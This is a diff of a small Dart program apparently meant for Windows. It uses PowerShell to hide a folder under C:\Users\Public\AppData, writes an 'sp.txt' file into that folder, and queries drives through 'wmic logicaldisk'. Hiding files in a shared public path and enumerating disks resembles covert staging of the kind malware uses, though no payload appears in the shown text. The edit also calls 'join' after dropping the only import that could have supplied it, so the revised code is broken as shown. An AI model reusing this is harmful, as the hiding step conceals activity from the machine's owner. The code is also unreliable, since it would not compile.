@@ -1,6 +1,5 @@
 import "dart:io";
 import "dart:convert";
-import 'package:file_utils/file_utils.dart';
 
 void main() {
   Process.run("powershell", [
@@ -18,10 +17,10 @@ void main() {
     "\$f=get-item C:\\Users\\Public\\AppData -Force;\$f.attributes='Hidden'"
   ]); // Set the folder as hidden.
 
-  List emptyList = [];
-
-  FileUtils.chdir("C:\\Users\\Public\\AppData");
-  new File("sp.txt").writeAsString(jsonEncode(emptyList));
+  // FileUtils.chdir("C:\\Users\\Public\\AppData");
+  String tp = join("C:", "Users", "Public", "AppData", "sp.txt");
+  print(tp);
+  new File(tp).writeAsString(jsonEncode([])); // Write empty list to "sp.txt".
 
   Process.run('wmic', [
     'logicaldisk',
